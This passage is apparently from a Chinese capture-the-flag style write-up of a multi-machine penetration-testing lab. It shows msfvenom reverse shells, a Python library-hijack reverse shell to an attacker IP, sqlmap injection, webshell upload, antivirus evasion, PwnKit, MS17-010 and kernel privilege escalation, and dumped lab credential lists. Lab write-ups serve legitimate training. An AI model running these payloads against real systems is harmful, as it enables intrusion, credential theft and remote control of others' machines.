   Comments: kernel.unprivileged_userns_clone&#x3D;1 required (to obtain CAP_NET_ADMIN)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里我本来打算先提权，再上马，结果发现这些个脚本都没法提权，没办法，继续上马，最后发现用<code>linux/x64/meterpreter/reverse_tcp</code>这个模块成功上马,，这里可以多试几次，可能是网络问题，导致我们有些时候没连上：</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.10.17.141 LPORT&#x3D;6666 -f elf &gt; shell.elf


msfconsole -q
use exploit&#x2F;multi&#x2F;handler
set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
set LHOST 10.10.17.141
set LPORT 6666
exploit -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>反弹shell出来后通过下面的命令获取可交互式终端，不然用不了sudo:</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;
&#x2F;&#x2F;或是
script &#x2F;dev&#x2F;null -c bash
export TERM&#x3D;xterm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后找config文件：</p>
<pre class="line-numbers language-none"><code class="language-none">www-data@DANTE-NIX02:~$ find &#x2F;var&#x2F;www&#x2F;html -type f -name &quot;*config*&quot; 2&gt;&#x2F;dev&#x2F;null 
&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;wp-content&#x2F;themes&#x2F;twentynineteen&#x2F;postcss.config.js
&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;akismet&#x2F;views&#x2F;config.php
&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;wp-admin&#x2F;setup-config.php
&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;wp-config.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后在<code>wp-config.php</code>文件中发现一个账号密码，<code>margaret</code>|<code>Welcome1!2@3#</code>：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250213205542707.png" alt="image-20250213205542707"></p>
<p>我们用sudo尝试下登陆，登陆成功，但是是受限模式，我们只能执行几个命令</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250213210130418.png" alt="image-20250213210130418"></p>
<p>直接限制绕过即可，参考 <a href="https://www.yongz.fun/posts/49dbd3aa.html">Linux rbash 限制绕过</a> 这篇文章，最后逃逸成功：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250213212521128.png" alt="image-20250213212521128"></p>
<p>在<code>/home/frank/Downloads</code>文件夹中发现下面的文件，我们把文件下载下来查看下</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250213221740047.png" alt="image-20250213221740047"></p>
<p>我们在解压之后中的secure文件夹中的json文件中找到了两个密码，<code>STARS5678FORTUNE401</code>、<code>69F15HST1CX</code></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250213224201257.png" alt="image-20250213224201257"></p>
<p>用户名就是frank，但我们测试过后都不能登陆，猜测可能是这个导出文件被加密了，我们看一眼他原本的<code>.config</code>文件夹中的内容，发现真正的密码：</p>
<p><code>TractorHeadtorchDeskmat</code>、<code>STARS5678FORTUNE401</code></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250213225414627.png" alt="image-20250213225414627"></p>
<p>然后我们登陆frank，继续向下走，然后我查看定时任务，发现没有什么特殊的东西，怀疑是隐藏的任务，我们用下工具<code>pspy</code>，我们能够发现一个特殊的进程：</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;pspy64 -pf -i 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214002713494.png" alt="image-20250214002713494"></p>
<p>我们再查看一下这个文件，内容如下</p>
<pre class="line-numbers language-none"><code class="language-none">import call
import urllib
url &#x3D; urllib.urlopen(localhost)
page&#x3D; url.getcode()
if page &#x3D;&#x3D;200:
        print (&quot;We&#39;re all good!&quot;)
else:
        print(&quot;We&#39;re failing!&quot;)
        call([&quot;systemctl start apache2&quot;], shell&#x3D;True)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但他的权限只有root才能读写，不能直接改变，但我们能在当前文件下编写一个<code>urllib.py</code>文件，在运行时，会优先引用当前文件夹中的内容</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">echo <span class="token string">'import os,pty,socket;s=socket.socket();s.connect(("10.10.17.141",9856));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'</span> <span class="token operator">></span> urllib<span class="token punctuation">.</span>py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在本地启动监听，等几分钟就能连上了</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214005322422.png" alt="image-20250214005322422"></p>
<p>这台机器我们就完成了。</p>
<h3 id="172-16-1-12"><a href="#172-16-1-12" class="headerlink" title="172.16.1.12"></a>172.16.1.12</h3><p>扫描结果：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216175547593.png" alt="image-20250216175547593"></p>
<p>直接就先看443和80端口，看看web服务是什么，登陆之后发现是<code>XAMPP Apache</code>服务，dirsearch扫描结果如下</p>
<pre class="line-numbers language-none"><code class="language-none">dirsearch -u https:&#x2F;&#x2F;172.16.1.12&#x2F; --proxy socks5:&#x2F;&#x2F;10.10.17.141:6021<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214154700756.png"></p>
<p>phpinfo.php中查看到php版本为7.4.7和一些其他东西，然后我们在网上搜索到当前服务的漏洞，只有windows环境下的漏洞，但我们当前环境是Linux，所以不合适，然后我们在<code>/blog</code>路由有一个博客页面，我们加上这个路由再扫一下：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214182607618.png" alt="image-20250214182607618"></p>
<p>并没有什么有用的东西，但是我们可以在路由中发现一个sql注入</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214182707793.png" alt="image-20250214182707793"></p>
<p>用sqlmap跑一下，找到我们本台机器的第一个flag和博客的admin相关内容，这里os-shell不成功：</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;172.16.1.12&#x2F;blog&#x2F;category.php?id&#x3D;2&quot; --proxy socks5:&#x2F;&#x2F;10.10.17.141:6021 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214183407914.png" alt="image-20250214183407914"></p>
<p>接下来我们读取密码之后我们，直接前台登陆即可</p>
<pre class="line-numbers language-none"><code class="language-none">admin |admin
ben   |Welcometomyblog
egre55|egre55<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>登陆到网页之后找半天，文件上传没权限，因为22端口开放，我们尝试用现有的密码登陆下，然后ben用户能够成功登陆，获取第二个flag</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains4 ssh ben@172.16.1.12 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214211023742.png" alt="image-20250214211023742"></p>
<p>然后通过msf上个线，方便我们后续进行提权，先将木马传上机器</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains4 scp &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;shell.elf ben@172.16.1.12:&#x2F;home&#x2F;ben<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>我们将提权漏洞扫描工具上传到机器上，扫描出如下结果：</p>
<pre class="line-numbers language-none"><code class="language-none">Available information:

Kernel version: 5.4.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 18.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

81 kernel space exploits
49 user space exploits

Possible Exploits:

cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-4034] PwnKit

   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2022&#x2F;01&#x2F;25&#x2F;cve-2021-4034&#x2F;pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu&#x3D;10|11|12|13|14|15|16|17|18|19|20|21 ],debian&#x3D;7|8|9|10|11,fedora,manjaro
   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;berdav&#x2F;CVE-2021-4034&#x2F;zip&#x2F;main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156&#x2F;baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint&#x3D;19,[ ubuntu&#x3D;18|20 ], debian&#x3D;10
   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;blasty&#x2F;CVE-2021-3156&#x2F;zip&#x2F;main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156&#x2F;baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos&#x3D;6|7|8,[ ubuntu&#x3D;14|16|17|18|19|20 ], debian&#x3D;9|10
   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;worawit&#x2F;CVE-2021-3156&#x2F;zip&#x2F;main

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https:&#x2F;&#x2F;research.nccgroup.com&#x2F;2022&#x2F;09&#x2F;01&#x2F;settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250&#x2F;
https:&#x2F;&#x2F;blog.theori.io&#x2F;research&#x2F;CVE-2022-32250-linux-kernel-lpe-2022&#x2F;
   Exposure: less probable
   Tags: ubuntu&#x3D;(22.04)&#123;kernel:5.15.0-27-generic&#125;
   Download URL: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;theori-io&#x2F;CVE-2022-32250-exploit&#x2F;main&#x2F;exp.c
   Comments: kernel.unprivileged_userns_clone&#x3D;1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2022&#x2F;08&#x2F;29&#x2F;5
   Exposure: less probable
   Tags: ubuntu&#x3D;(20.04)&#123;kernel:5.12.13&#125;
   Download URL: https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2022&#x2F;08&#x2F;29&#x2F;5&#x2F;1
   Comments: kernel.unprivileged_userns_clone&#x3D;1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https:&#x2F;&#x2F;google.github.io&#x2F;security-research&#x2F;pocs&#x2F;linux&#x2F;cve-2021-22555&#x2F;writeup.html
   Exposure: less probable
   Tags: ubuntu&#x3D;20.04&#123;kernel:5.8.0-*&#125;
   Download URL: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;google&#x2F;security-research&#x2F;master&#x2F;pocs&#x2F;linux&#x2F;cve-2021-22555&#x2F;exploit.c
   ext-url: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;bcoles&#x2F;kernel-exploits&#x2F;master&#x2F;CVE-2021-22555&#x2F;exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https:&#x2F;&#x2F;dylankatz.com&#x2F;Analysis-of-CVE-2019-18634&#x2F;
   Exposure: less probable
   Tags: mint&#x3D;19
   Download URL: https:&#x2F;&#x2F;github.com&#x2F;saleemrashid&#x2F;sudo-cve-2019-18634&#x2F;raw&#x2F;master&#x2F;exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;project-zero&#x2F;issues&#x2F;detail?id&#x3D;1072
   Exposure: less probable
   Tags: ubuntu&#x3D;16.04&#123;ntfs-3g:2015.3.14AR.1-1build1&#125;,debian&#x3D;7.0&#123;ntfs-3g:2012.1.15AR.5-2.1+deb7u2&#125;,debian&#x3D;8.0&#123;ntfs-3g:2014.2.15AR.2-1+deb8u2&#125;
   Download URL: https:&#x2F;&#x2F;gitlab.com&#x2F;exploit-database&#x2F;exploitdb-bin-sploits&#x2F;-&#x2F;raw&#x2F;main&#x2F;bin-sploits&#x2F;41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们直接利用msf的模块，搜索CVE-2021-4034得到<code>exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec</code>模块，利用这个模块低权到root，得到第三个flag</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214222052718.png" alt="image-20250214222052718"></p>
<p>这台机器也就完成了。</p>
<h3 id="172-16-1-13"><a href="#172-16-1-13" class="headerlink" title="172.16.1.13"></a>172.16.1.13</h3><p>扫描结果：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216175507904.png" alt="image-20250216175507904"></p>
<p>我们先看80和443端口，扫出如下内容</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214224400375.png" alt="image-20250214224400375"></p>
<p>我们能发现他的版本和服务跟上面172.16.1.12是相同的，不同的是这个机器是windows系统，我们还能在<code>/cgi-bin/printenv.pl</code>这个文件中找到相关的路径，我们尝试下这个系统的漏洞，</p>
<pre class="line-numbers language-none"><code class="language-none">COMSPEC&#x3D;&quot;C:\WINDOWS\system32\cmd.exe&quot;
CONTEXT_DOCUMENT_ROOT&#x3D;&quot;C:&#x2F;xampp&#x2F;cgi-bin&#x2F;&quot;
CONTEXT_PREFIX&#x3D;&quot;&#x2F;cgi-bin&#x2F;&quot;
DOCUMENT_ROOT&#x3D;&quot;C:&#x2F;xampp&#x2F;htdocs&quot;
GATEWAY_INTERFACE&#x3D;&quot;CGI&#x2F;1.1&quot;
HTTP_ACCEPT&#x3D;&quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&quot;
HTTP_ACCEPT_ENCODING&#x3D;&quot;gzip, deflate&quot;
HTTP_ACCEPT_LANGUAGE&#x3D;&quot;zh-SG,en-US;q&#x3D;0.7,en;q&#x3D;0.3&quot;
HTTP_CONNECTION&#x3D;&quot;keep-alive&quot;
HTTP_HOST&#x3D;&quot;172.16.1.13&quot;
HTTP_UPGRADE_INSECURE_REQUESTS&#x3D;&quot;1&quot;
HTTP_USER_AGENT&#x3D;&quot;Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:109.0) Gecko&#x2F;20100101 Firefox&#x2F;115.0&quot;
MIBDIRS&#x3D;&quot;C:&#x2F;xampp&#x2F;php&#x2F;extras&#x2F;mibs&quot;
MYSQL_HOME&#x3D;&quot;\xampp\mysql\bin&quot;
OPENSSL_CONF&#x3D;&quot;C:&#x2F;xampp&#x2F;apache&#x2F;bin&#x2F;openssl.cnf&quot;
PATH&#x3D;&quot;C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Users\gerald\AppData\Local\Microsoft\WindowsApps&quot;
PATHEXT&#x3D;&quot;.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC&quot;
PHPRC&#x3D;&quot;\xampp\php&quot;
PHP_PEAR_SYSCONF_DIR&#x3D;&quot;\xampp\php&quot;
QUERY_STRING&#x3D;&quot;&quot;
REMOTE_ADDR&#x3D;&quot;172.16.1.100&quot;
REMOTE_PORT&#x3D;&quot;44610&quot;
REQUEST_METHOD&#x3D;&quot;GET&quot;
REQUEST_SCHEME&#x3D;&quot;http&quot;
REQUEST_URI&#x3D;&quot;&#x2F;cgi-bin&#x2F;printenv.pl&quot;
SCRIPT_FILENAME&#x3D;&quot;C:&#x2F;xampp&#x2F;cgi-bin&#x2F;printenv.pl&quot;
SCRIPT_NAME&#x3D;&quot;&#x2F;cgi-bin&#x2F;printenv.pl&quot;
SERVER_ADDR&#x3D;&quot;172.16.1.13&quot;
SERVER_ADMIN&#x3D;&quot;postmaster@localhost&quot;
SERVER_NAME&#x3D;&quot;172.16.1.13&quot;
SERVER_PORT&#x3D;&quot;80&quot;
SERVER_PROTOCOL&#x3D;&quot;HTTP&#x2F;1.1&quot;
SERVER_SIGNATURE&#x3D;&quot;&lt;address&gt;Apache&#x2F;2.4.43 (Win64) OpenSSL&#x2F;1.1.1g PHP&#x2F;7.4.7 Server at 172.16.1.13 Port 80&lt;&#x2F;address&gt;\n&quot;
SERVER_SOFTWARE&#x3D;&quot;Apache&#x2F;2.4.43 (Win64) OpenSSL&#x2F;1.1.1g PHP&#x2F;7.4.7&quot;
SYSTEMROOT&#x3D;&quot;C:\WINDOWS&quot;
TMP&#x3D;&quot;\xampp\tmp&quot;
WINDIR&#x3D;&quot;C:\WINDOWS&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后我们能够找到一个<code>/discuss/</code>路由，存在一个注册用户，我们随便注册一个账号登陆进去：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250215124022490.png" alt="image-20250215124022490"></p>
<p>登陆后在用户修改信息界面能够发现一个文件上传点，我们直接上传shell即可，就只有前端过滤：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250215124205012.png" alt="image-20250215124205012"></p>
<p>我们直接上传木马后用蚁剑连接即可：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250215150005718.png" alt="image-20250215150005718"></p>
<p>然后上传一个smf的shell，稳固下连接，方便后续提权，而且环境开启了windows的防火墙，我们这里直接通过掩日工具来进行免杀，就能成功绕过：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250215164907729.png" alt="image-20250215164907729"></p>
<p>这里存存在一个sql注入，是在web页面的用户修改位置，但是注入是布尔盲注，写脚本有些太麻烦了，sqlmap也不能跑，最后是在渗透完成后直接写的一个php文件来对数据库进行查询的：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">ExecuteQuery</span><span class="token punctuation">(</span><span class="token variable">$SQL</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>   
    <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"tech_forum"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"数据库连接失败: "</span> <span class="token operator">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$rows</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$SQL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"查询失败: "</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$rows</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// 执行查询</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">ExecuteQuery</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 输出 JSON 格式</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: application/json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant">JSON_PRETTY_PRINT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"请提供 SQL 语句，如：query.php?sql=SELECT * FROM users"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但里面没啥东西，flag也没有。我就不过多讲了。</p>
<p>然后正常进行信息收集进行提权，我们这里直接通过msf进行可用漏洞扫描，发现如下可用漏洞：</p>
<pre class="line-numbers language-none"><code class="language-none">run post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250215165409392.png" alt="image-20250215165409392"></p>
<p>但这里我们不要直接通过msf进行提权，这里我一个一个是下来发现最后能通过<code>exploit/windows/local/cve_2022_21882_win32k</code>这个漏洞模块来进行提权，获得admin权限，在Administrator中获得的我们的flag。</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250215231506002.png" alt="image-20250215231506002"></p>
<p>然后看了眼，这台机器没有域，所以这台机器也就完成了：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250215231730835.png" alt="image-20250215231730835"></p>
<h3 id="172-16-1-20"><a href="#172-16-1-20" class="headerlink" title="172.16.1.20"></a>172.16.1.20</h3><p>扫描结果：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216175327674.png" alt="image-20250216175327674"></p>
<p>由于我们扫描出存在永恒之蓝漏洞，我们这里就直接拿这个漏洞试一下，我们先检查下是否能够攻击这个漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010
set rhost 172.16.1.20
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>结果如下：</p>
<p><img src="C:/Users/35962/AppData/Roaming/Typora/typora-user-images/image-20250216180107746.png" alt="image-20250216180107746"></p>
<p>发现是能够进行攻击的，我们直接利用攻击脚本进行攻击：</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec
set lhost 10.10.17.141
set lport 8888
set rhost 172.16.1.20
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216183330141.png" alt="image-20250216183330141"></p>
<p>可以发现攻击成功，最后在<code>C:\Users\katwamba\Desktop</code>发现flag，并且还有一个<code>employee_backup.xlsx</code>文件，我们一样下载下来看看</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218144146483.png" alt="image-20250218144146483"></p>
<p>发现是一堆像是用户名和密码的东西，保存下备用：</p>
<pre class="line-numbers language-none"><code class="language-none">asmith	Princess1
smoggat	Summer2019
tmodle	P45678!
ccraven	Password1
kploty	Teacher65
jbercov	4567Holiday1
whaguey	acb123
dcamtan	WorldOfWarcraft67
tspadly	RopeBlackfieldForwardslash
ematlis	JuneJuly1TY
fglacdon	FinalFantasy7
tmentrso	65RedBalloons
dharding	WestminsterOrange5
smillar	MarksAndSparks91
bjohnston	Bullingdon1
iahmed	Sheffield23
plongbottom	PowerfixSaturdayClub777
jcarrot	Tanenbaum0001
lgesley	SuperStrongCantForget123456789

asmith:Princess1
smoggat:Summer2019
tmodle:P45678!
ccraven:Password1
kploty:Teacher65
jbercov:4567Holiday1
whaguey:acb123
dcamtan:WorldOfWarcraft67
tspadly:RopeBlackfieldForwardslash
ematlis:JuneJuly1TY
fglacdon:FinalFantasy7
tmentrso:65RedBalloons
dharding:WestminsterOrange5
smillar:MarksAndSparks91
bjohnston:Bullingdon1
iahmed:Sheffield23
plongbottom:PowerfixSaturdayClub777
jcarrot:Tanenbaum0001
lgesley:SuperStrongCantForget123456789
julian:manchesterunited
ben:Welcometomyblog
balthazar:TheJoker12345!
mrb3n:S3kur1ty2020!
Admin_129834765:SamsungOctober102030<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们查看用户信息时发现在mrb3n用户的用户信息中存在一个flag和该用户的密码</p>
